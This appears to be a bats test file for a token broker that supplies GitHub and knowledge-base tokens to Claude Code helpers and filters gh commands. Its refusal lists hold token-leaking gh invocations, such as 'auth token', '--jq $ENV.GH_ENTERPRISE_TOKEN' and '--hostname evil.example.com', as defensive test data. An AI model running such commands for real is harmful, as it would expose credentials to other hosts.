#!/usr/bin/env bats
# shellcheck disable=SC2030,SC2031  # bats test bodies run in subshells; variable modifications are intentionally scoped
# shellcheck disable=SC2154  # stderr is set by run --separate-stderr

bats_require_minimum_version 1.5.0

load test_helper

MCP_DIR="${REPO_ROOT}/containers/base/development-full/claude-mcp"
BROKER="${REPO_ROOT}/containers/base/development-full/token-broker/token-broker"
GH_WRAPPER="${REPO_ROOT}/containers/base/development-full/token-broker/gh"

setup() {
    setup_isolated_env
    # A Unix socket path is limited to 108 bytes, so the broker's directory sits directly in the
    # temporary directory rather than under the much longer bats test directory.
    BROKER_DIR="$(mktemp -d "${TMPDIR:-/tmp}/tb.XXXXXX")"
    export BROKER_DIR
    export TOKEN_BROKER_SOCKET="${BROKER_DIR}/run/socket"
    mkdir -p "${BROKER_DIR}/secrets" "${BROKER_DIR}/empty" "${BROKER_DIR}/gh-config" "${TEST_TMP}/work"
    printf 'gh_secret_token\n' > "${BROKER_DIR}/secrets/gh-token"
    printf 'kb_secret_token' > "${BROKER_DIR}/secrets/kb-mcp-token"
    write_real_gh
}

teardown() {
    stop_broker
    rm -rf "${BROKER_DIR}"
    cleanup_stubs
}

# The real gh the broker runs. It starts with an empty PATH, so it is plain bash using builtins
# only (make_stub's /usr/bin/env shebang would not resolve): it reports what it was given and
# exits 7 so the exit status can be seen passing through.
write_real_gh() {
    # The broker gives gh a clean environment, so the path of the file marking that it ran is
    # written into the script itself.
    printf '#!/bin/bash\n: > %q\n' "${BROKER_DIR}/gh-ran" > "${STUB_BIN}/gh-real"
    cat >> "${STUB_BIN}/gh-real" <<'EOF'
printf 'argv:%s\n' "$*"
printf 'enterprise:%s\n' "${GH_ENTERPRISE_TOKEN:-unset}"
printf 'token:%s\n' "${GH_TOKEN:-unset}"
printf 'host:%s\n' "${GH_HOST:-unset}"
printf 'path:%s\n' "${PATH:-unset}"
printf 'home:%s\n' "${HOME:-unset}"
printf 'config:%s\n' "${GH_CONFIG_DIR:-unset}"
printf 'repo:%s\n' "${GH_REPO:-unset}"
printf 'term:%s\n' "${TERM:-unset}"
printf 'foo:%s\n' "${FOO:-unset}"
printf 'cwd:%s\n' "$(pwd -P)"
read -r line && printf 'stdin:%s\n' "${line}"
printf 'gh stderr\n' >&2
exit 7
EOF
    chmod +x "${STUB_BIN}/gh-real"
}

# Starts the broker in the background with the test settings, then any NAME=value overrides, and
# waits for its socket.
start_broker() {
    env TOKEN_BROKER_SOCKET="${TOKEN_BROKER_SOCKET}" \
        TOKEN_BROKER_SECRETS_DIR="${BROKER_DIR}/secrets" \
        TOKEN_BROKER_CLAUDE_PID="$$" \
        TOKEN_BROKER_PEER_UID="$(id -u)" \
        TOKEN_BROKER_PEER_GID="$(id -g)" \
        TOKEN_BROKER_HELPER_DIR="${MCP_DIR}" \
        TOKEN_BROKER_GH_BIN="${STUB_BIN}/gh-real" \
        TOKEN_BROKER_GH_CONFIG_DIR="${BROKER_DIR}/gh-config" \
        TOKEN_BROKER_GH_PATH="${BROKER_DIR}/empty" \
        GH_HOST=github-api.example.com \
        "$@" "${BROKER}" serve </dev/null >"${BROKER_DIR}/broker.log" 2>&1 3>&- &
    BROKER_PID=$!
    local attempt
    for attempt in $(seq 50); do
        [ -S "${TOKEN_BROKER_SOCKET}" ] && return 0
        sleep 0.1
    done
    cat "${BROKER_DIR}/broker.log" >&2
    echo "broker never created its socket after ${attempt} attempts" >&2
    return 1
}

stop_broker() {
    [ -n "${BROKER_PID:-}" ] || return 0
    kill "${BROKER_PID}" 2>/dev/null || true
    wait "${BROKER_PID}" 2>/dev/null || true
    BROKER_PID=""
}

# Runs a headers helper as Claude Code would, with the broker socket and client from this test.
run_helper() {
    run --separate-stderr env -i "PATH=/usr/bin:/bin" "TOKEN_BROKER_SOCKET=${TOKEN_BROKER_SOCKET}" \
        "TOKEN_BROKER_BIN=${BROKER}" "$@"
}

@test "the cfwf helper gets the GitHub token from the broker's secret file" {
    start_broker GH_ENTERPRISE_TOKEN=gh_from_env
    run_helper "${MCP_DIR}/cfwf-mcp-headers"
    [ "${status}" -eq 0 ]
    [ "${output}" = '{"Authorization":"Bearer gh_secret_token"}' ]
}

@test "the kb helper gets the kb token from the broker's secret file" {
    start_broker KB_MCP_TOKEN=kb_from_env
    run_helper "${MCP_DIR}/kb-mcp-headers"
    [ "${status}" -eq 0 ]
    [ "${output}" = '{"Authorization":"Bearer kb_secret_token"}' ]
}

@test "with no secret files the broker falls back to the tokens it inherited" {
    rm "${BROKER_DIR}/secrets/gh-token" "${BROKER_DIR}/secrets/kb-mcp-token"
    start_broker GH_ENTERPRISE_TOKEN=gh_from_env KB_MCP_TOKEN=kb_from_env
    run_helper "${MCP_DIR}/cfwf-mcp-headers"
    [ "${output}" = '{"Authorization":"Bearer gh_from_env"}' ]
    run_helper "${MCP_DIR}/kb-mcp-headers"
    [ "${output}" = '{"Authorization":"Bearer kb_from_env"}' ]
}

@test "a missing kb token refuses kb headers but still serves cfwf" {
    rm "${BROKER_DIR}/secrets/kb-mcp-token"
    start_broker
    run_helper "${MCP_DIR}/kb-mcp-headers"
    [ "${status}" -eq 1 ]
    [ -z "${output}" ]
    [[ "${stderr}" == *'no kb token'* ]]
    run_helper "${MCP_DIR}/cfwf-mcp-headers"
    [ "${status}" -eq 0 ]
}

@test "a header request that does not come from the helper is refused" {
    start_broker
    run --separate-stderr "${BROKER}" header cfwf
    [ "${status}" -eq 1 ]
    [ -z "${output}" ]
    [[ "${stderr}" == *'not the cfwf headersHelper'* ]]
    [ "$(grep -c 'gh_secret_token' "${BROKER_DIR}/broker.log")" -eq 0 ]
}

@test "a copy of the helper outside the helper directory is refused" {
    start_broker
    cp "${MCP_DIR}/cfwf-mcp-headers" "${TEST_TMP}/cfwf-mcp-headers"
    run_helper "${TEST_TMP}/cfwf-mcp-headers"
    [ "${status}" -eq 1 ]
    [ -z "${output}" ]
}

@test "a parent that is the kb helper cannot ask for the cfwf token" {
    start_broker
    sed 's/header kb/header cfwf/' "${MCP_DIR}/kb-mcp-headers" > "${TEST_TMP}/kb-asks-cfwf"
    run_helper /bin/bash -c "exec -a '${MCP_DIR}/kb-mcp-headers' /bin/bash '${TEST_TMP}/kb-asks-cfwf'"
    [ "${status}" -eq 1 ]
    [ -z "${output}" ]
    [[ "${stderr}" == *'not the cfwf headersHelper'* ]]
}

@test "the helper run in a session of its own (as a Bash tool command is) is refused" {
    start_broker
    run_helper setsid -w "${MCP_DIR}/cfwf-mcp-headers"
    [ "${status}" -eq 1 ]
    [ -z "${output}" ]
    [[ "${stderr}" == *"not in Claude Code's session"* ]]
}

@test "requests from a user other than the agent are refused" {
    start_broker TOKEN_BROKER_PEER_UID=99999
    run_helper "${MCP_DIR}/cfwf-mcp-headers"
    [ "${status}" -eq 1 ]
    [[ "${stderr}" == *'only answered for the agent'* ]]
    run --separate-stderr "${BROKER}" gh pr list
    [ "${status}" -eq 1 ]
    [ ! -e "${BROKER_DIR}/gh-ran" ]
}

@test "an unknown MCP server is refused" {
    start_broker
    run --separate-stderr "${BROKER}" header other
    [ "${status}" -eq 1 ]
    [[ "${stderr}" == *'unknown MCP server'* ]]
}

@test "a token that is not a bearer token is refused" {
    printf 'bad token\n' > "${BROKER_DIR}/secrets/gh-token"
    start_broker
    run_helper "${MCP_DIR}/cfwf-mcp-headers"
    [ "${status}" -eq 1 ]
    [ -z "${output}" ]
    [[ "${stderr}" != *'bad token'* ]]
}

@test "serve without TOKEN_BROKER_CLAUDE_PID fails" {
    run --separate-stderr env -u TOKEN_BROKER_CLAUDE_PID "${BROKER}" serve
    [ "${status}" -eq 1 ]
    [[ "${stderr}" == *'TOKEN_BROKER_CLAUDE_PID'* ]]
}

@test "an unknown subcommand prints usage" {
    run --separate-stderr "${BROKER}" other
    [ "${status}" -eq 2 ]
    [[ "${stderr}" == *'usage:'* ]]
}

@test "gh runs with the token in a clean environment on the caller's stdio and directory" {
    start_broker
    cd "${TEST_TMP}/work"
    run --separate-stderr env FOO=leak TERM=xterm GH_REPO=owner/repo "${BROKER}" gh pr list -R owner/repo <<<"from stdin"
    [ "${status}" -eq 7 ]
    [[ "${output}" == *'argv:pr list -R owner/repo'* ]]
    [[ "${output}" == *'enterprise:gh_secret_token'* ]]
    [[ "${output}" == *'token:unset'* ]]
    [[ "${output}" == *'host:github-api.example.com'* ]]
    [[ "${output}" == *"path:${BROKER_DIR}/empty"* ]]
    [[ "${output}" == *"home:${BROKER_DIR}/empty"* ]]
    [[ "${output}" == *"config:${BROKER_DIR}/gh-config"* ]]
    [[ "${output}" == *'repo:owner/repo'* ]]
    [[ "${output}" == *'term:xterm'* ]]
    [[ "${output}" == *'foo:unset'* ]]
    [[ "${output}" == *"cwd:$(pwd -P)"* ]]
    [[ "${output}" == *'stdin:from stdin'* ]]
    [ "${stderr}" = 'gh stderr' ] || { echo "stderr was: ${stderr}" >&2; return 1; }
}

@test "gh is given GH_TOKEN when GH_HOST is github.com" {
    start_broker GH_HOST=github.com
    run --separate-stderr "${BROKER}" gh api user </dev/null
    [ "${status}" -eq 7 ]
    [[ "${output}" == *'token:gh_secret_token'* ]]
    [[ "${output}" == *'enterprise:unset'* ]]
}

@test "a GH_REPO that is not OWNER/REPO is not passed to gh" {
    start_broker
    run --separate-stderr env GH_REPO=evil.example.com/owner/repo "${BROKER}" gh pr list </dev/null
    [ "${status}" -eq 7 ]
    [[ "${output}" == *'repo:unset'* ]]
}

@test "gh requests that could leak the token or reach another host are refused" {
    start_broker
    local -a refused=(
        "auth token"
        "auth status --show-token"
        "config set git_protocol https"
        "alias set x api"
        "extension install owner/ext"
        "api user --hostname evil.example.com"
        "api user --hostname=evil.example.com"
        "api user --verbose"
        "pr list -R evil.example.com/owner/repo"
        "pr list --repo=evil.example.com/owner/repo"
        "pr list -Revil.example.com/owner/repo"
        "pr list -wR evil.example.com/owner/repo"
        "api https://evil.example.com/x"
        "api HTTP://evil.example.com/x"
        "repo view git@evil.example.com:owner/repo"
        "repo view evil.example.com/owner/repo"
        "api user --jq \$ENV.GH_ENTERPRISE_TOKEN"
        "api user --jq=env.GH_ENTERPRISE_TOKEN"
        "api user -q env"
        "api user -q.login|env"
    )
    local args
    for args in "${refused[@]}"; do
        # shellcheck disable=SC2086  # each entry is a space-separated argument list
        run --separate-stderr "${BROKER}" gh ${args} </dev/null
        [ "${status}" -eq 1 ] || { echo "accepted: gh ${args}" >&2; return 1; }
        [ ! -e "${BROKER_DIR}/gh-ran" ] || { echo "ran gh for: gh ${args}" >&2; return 1; }
        [[ "${output}" != *'gh_secret_token'* ]] || { echo "leaked for: gh ${args}" >&2; return 1; }
    done
}

@test "a github.com issue or pull request URL is allowed as the --url of gh project item-add" {
    start_broker
    local -a allowed=(
        "project item-add 3 --owner owner --url https://github.com/owner/repo/issues/5"
        "project item-add 3 --owner owner --url=https://github.com/owner/repo.name/pull/12"
        "project item-add 3 --url HTTPS://GitHub.com/Owner/repo_1/issues/7 --owner owner"
    )
    local args
    for args in "${allowed[@]}"; do
        # shellcheck disable=SC2086  # each entry is a space-separated argument list
        run --separate-stderr "${BROKER}" gh ${args} </dev/null
        if [ "${status}" -ne 7 ]; then
            echo "refused: gh ${args}: ${stderr}" >&2
            return 1
        fi
        [[ "${output}" == *"argv:${args}"* ]]
    done
}

@test "every other URL is refused, including one near the --url of gh project item-add" {
    start_broker
    local -a refused=(
        "project item-add 3 --owner owner https://github.com/owner/repo/issues/5"
        "project item-add 3 --owner owner --url https://github.com/owner/repo/issues/5 https://github.com/owner/repo/issues/6"
        "project item-edit --id x --url https://github.com/owner/repo/issues/5"
        "issue view https://github.com/owner/repo/issues/5"
        "pr view --url https://github.com/owner/repo/pull/5"
        "api --url=https://github.com/owner/repo/issues/5"
        "pr list -R owner/repo --search=https://evil.example.com/x"
        "project item-add 3 --owner owner --url https://evil.example.com/owner/repo/issues/5"
        "project item-add 3 --owner owner --url=https://evil.example.com/owner/repo/pull/5"
        "project item-add 3 --owner owner --url https://github-api.example.com/owner/repo/issues/5"
        "project item-add 3 --owner owner --url https://github.com.evil.example.com/owner/repo/issues/5"
        "project item-add 3 --owner owner --url https://github.com:8443/owner/repo/issues/5"
        "project item-add 3 --owner owner --url https://user@github.com/owner/repo/issues/5"
        "project item-add 3 --owner owner --url http://github.com/owner/repo/issues/5"
        "project item-add 3 --owner owner --url https://github.com/owner/repo/issues/5/extra"
        "project item-add 3 --owner owner --url https://github.com/owner/repo/issues/5?x=1"
        "project item-add 3 --owner owner --url https://github.com/owner/repo/issues/5#frag"
        "project item-add 3 --owner owner --url https://github.com/owner/repo/issues/5/"
        "project item-add 3 --owner owner --url https://github.com/owner/repo/discussions/5"
        "project item-add 3 --owner owner --url https://github.com/owner/repo/issues/05"
        "project item-add 3 --owner owner --url https://github.com/a/b/c/issues/5"
        "project item-add 3 --owner owner --url=https://github.com/owner/repo/pull/x"
        "project item-add 3 --owner owner -- --url https://github.com/owner/repo/issues/5"
        "project item-add 3 --owner owner --url ssh://github.com/owner/repo/issues/5"
        "project item-add 3 --owner owner --url git@github.com:owner/repo/issues/5"
    )
    local args
    for args in "${refused[@]}"; do
        # shellcheck disable=SC2086  # each entry is a space-separated argument list
        run --separate-stderr "${BROKER}" gh ${args} </dev/null
        if [ "${status}" -ne 1 ]; then
            echo "accepted: gh ${args}" >&2
            return 1
        fi
        if [[ "${stderr}" != *'URLs are not allowed'* ]]; then
            echo "wrong reason for gh ${args}: ${stderr}" >&2
            return 1
        fi
    done
    [ ! -e "${BROKER_DIR}/gh-ran" ]
}

@test "a project item URL does not loosen the --repo, --hostname or --jq rules" {
    start_broker
    local -a refused=(
        "project item-add 3 --url https://github.com/owner/repo/issues/5 --hostname evil.example.com"
        "project item-add 3 --url https://github.com/owner/repo/issues/5 -R evil.example.com/owner/repo"
        "project item-add 3 --url https://github.com/owner/repo/issues/5 --jq \$ENV.GH_ENTERPRISE_TOKEN"
        "project item-add 3 --url https://github.com/owner/repo/issues/5 evil.example.com/owner/repo"
    )
    local args
    for args in "${refused[@]}"; do
        # shellcheck disable=SC2086  # each entry is a space-separated argument list
        run --separate-stderr "${BROKER}" gh ${args} </dev/null
        if [ "${status}" -ne 1 ]; then
            echo "accepted: gh ${args}" >&2
            return 1
        fi
    done
    [ ! -e "${BROKER_DIR}/gh-ran" ]
}

@test "ordinary gh requests are allowed" {
    start_broker
    local -a allowed=(
        "pr list -R owner/repo"
        "pr view 12 --repo=owner/repo.name"
        "api repos/owner/repo/pulls --jq .[].number"
        "api user -q .login"
        "repo view github-api.example.com/owner/repo"
        "issue create --title fix --body see.example.com/a/b=c"
    )
    local args
    for args in "${allowed[@]}"; do
        # shellcheck disable=SC2086  # each entry is a space-separated argument list
        run --separate-stderr "${BROKER}" gh ${args} </dev/null
        [ "${status}" -eq 7 ] || { echo "refused: gh ${args}: ${stderr}" >&2; return 1; }
    done
    [ -e "${BROKER_DIR}/gh-ran" ]
}

@test "the gh wrapper goes through the broker while its socket exists" {
    start_broker
    run --separate-stderr env TOKEN_BROKER_BIN="${BROKER}" TOKEN_BROKER_GH_BIN=/nonexistent \
        "${GH_WRAPPER}" pr list </dev/null
    [ "${status}" -eq 7 ]
    [[ "${output}" == *'enterprise:gh_secret_token'* ]]
}

@test "the gh wrapper runs the real gh directly when there is no broker" {
    run --separate-stderr env TOKEN_BROKER_SOCKET="${BROKER_DIR}/absent" TOKEN_BROKER_BIN=/nonexistent \
        TOKEN_BROKER_GH_BIN="${STUB_BIN}/gh-real" GH_ENTERPRISE_TOKEN=from_env "${GH_WRAPPER}" pr list </dev/null
    [ "${status}" -eq 7 ]
    [[ "${output}" == *'argv:pr list'* ]]
    [[ "${output}" == *'enterprise:from_env'* ]]
}

@test "the broker's socket is open to every user and its directory is not writable by them" {
    start_broker
    [ "$(stat -c '%a' "${TOKEN_BROKER_SOCKET}")" = '666' ]
    [ "$(stat -c '%a' "${BROKER_DIR}/run")" = '755' ]
    [ "$(stat -c '%a' "${BROKER_DIR}/run/gh-state")" = '700' ]
    [ "$(stat -c '%a' "${BROKER_DIR}/run/gh-cache")" = '700' ]
}
